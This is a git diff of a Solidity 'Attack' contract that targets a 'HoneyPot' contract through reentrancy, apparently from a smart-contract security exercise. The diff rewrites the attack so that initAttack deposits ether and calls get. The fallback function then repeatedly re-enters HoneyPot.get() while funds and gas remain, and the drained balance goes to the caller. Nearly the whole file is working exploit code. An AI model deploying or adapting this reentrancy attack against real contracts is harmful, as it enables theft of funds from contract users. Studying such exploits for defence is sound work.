@@ -4,31 +4,27 @@ import "./HoneyPot.sol";
 
 contract Attack{
 
-    address public owner;
-    HoneyPot public honeypot;
+    bool done;
 
-    constructor (address _honeypot) public {
+    function initAttack(address _honeypot) public payable{
 
-        owner = msg.sender;
-        honeypot = HoneyPot(_honeypot);
-    }
+        require(address(_honeypot).balance%msg.value == 0, "will not drain the contract");
 
-    function initAttack() public payable{
+        HoneyPot(_honeypot).put.value(msg.value)();
+        HoneyPot(_honeypot).get();
 
-        honeypot.put.value(msg.value)();
-        honeypot.get();
-    }
-
-    function killSwitch() public returns(bool){
-
-        require(msg.sender == owner);
-        selfdestruct(owner);
-        return true;
+        require(address(this).balance > 0);
+        
+        if(!done){
+            
+            done = true;
+            msg.sender.transfer(address(this).balance);
+        }
     }
 
     function () public payable{
         
-        if(address(honeypot).balance > 0)
-            honeypot.get();
+        if(msg.sender.balance > 0 && gasleft() >= 3000000)
+            HoneyPot(msg.sender).get();
     }
 }
